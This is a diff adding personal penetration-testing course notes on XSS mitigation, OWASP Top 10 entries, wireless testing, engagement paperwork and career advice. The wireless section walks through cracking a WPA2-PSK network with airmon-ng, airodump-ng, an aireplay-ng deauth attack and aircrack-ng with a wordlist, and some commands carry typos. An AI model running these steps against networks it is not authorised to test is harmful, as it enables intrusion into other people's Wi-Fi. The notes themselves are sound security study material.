@@ -318,8 +318,133 @@ echo = Hi $username!";
 
 
 * 1. **ENCODING**
-      * ```<becomes&lt;
+      * ```<becomes&lt; ```
+      * ```<scripy>becomes &lt;script> ```
+* 2. **Filtering**
+      * ```<script> brcomes script ```
+* 3. **Vaildating**
+      * Compare input against white list
+* 4. **Sanitization**
+      * Combination of escaping, filtering, and validation
+   
+   
+   
+### Insecure Deserialization
+
+* OWASP A8-Insecure Deserialization: https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization
+
+* ysoserial tool
+
+
+### Using Components with Known Vulnerabilities
+
+* OWASP A9-Using Components with Known Vulnerabilities: https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities
+
+* Nessus
+
+* Shodan
+* Always Patch
+
+
+### Insufficient Logging and Monitoring
+
+
+* OWASP A10-Insufficient Logging & Monitoring: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring.html
+
+
+
+
+## Wireless Penetration Testing
+
+### 001_Wireless_Penetration_Testing_Overview
+
+* Assesent of Wireless network
+      * WPA2 PSK
+      * WPA2 Enterprise
+* Activities performed
+      * Evaluating strength of PSK
+      * Reviewing nearby network 
+      * Assessing guest networks
+      * Checking network access
       
+* Tools Being Used
+      * Wireless card
+      * Router
+      * Laptop
+
+* Hacking Process (WPA2 PSK)
+      * Place - Place wireless card into monitor mode
+      * Discover - Discover information about network
+            * Channel
+            * BSSID
+      * Select - Select network and capture data
+      * Perform - Perform deauth attack
+      * Capture - Capture WPA handshake
+      * Attempt - Attempt to crack the handshake
+      
+### 002_WPA_PS2_Exploit_Walkthrough
+
+* place
+   * ```airmon-ng check kill ```
+   * ```airmon-ng start wlan0 ```
+
+* Discover 
+   * ```airodump-ng wlan0mon ```
+
+* Select 
+   * ```airodump-ng -c 6 --bssid 50:CA:BA:8A:00:73 -w capture wlan0mon ```
+   
+* Perform
+   * ```aireplay-ng -0 1 -a 50:CA:BA:8A:00:73 -c 50:00:00:AF:00:73 ```
+   
+* Capture 
+   * we dont need to deauth if we capture enough data but it take time
+   
+* Attempt
+   * ```arircrack-ng -w rockyou.txt -b 50:CA:BA:8A:00:73 capture02.cap ```
+   
+
+
+## Legal Documents and Report Writing
+
+### 001_Common_Legal_Documents
+
+* Sales
+   * Mutual Non-Disclosure Agreement(NDA)
+   * Master Service Agreement (MSA)
+   * Statement of Work (SOW)
+   * Other: Sample Report, Recommendation Letters,etc.
+
+* Before You Test
+   * Rules of Engagement(ROE)
+
+* After You Test
+   * Findings Report
+   
+
+
+### 002_Pentest_Report_Writing
+
+
+* Sample Pentest Report: https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
+
+
+
+## Life/Career Advice
+
+
+* Always set goals for yourself and stay motivated
+* Do not become complacent
+* Never be afraifd to apply to jobs you're unqualified for 
+* Be willing to admit that you don't know 
+* Be willing to prove yourself
+* Determine what you want from a job and only apply to those that meet your criteria
+* Strive to be the dumbest guy or girl in the room 
+* Network , Netowrk, network
+
+
+
+
 
 
 
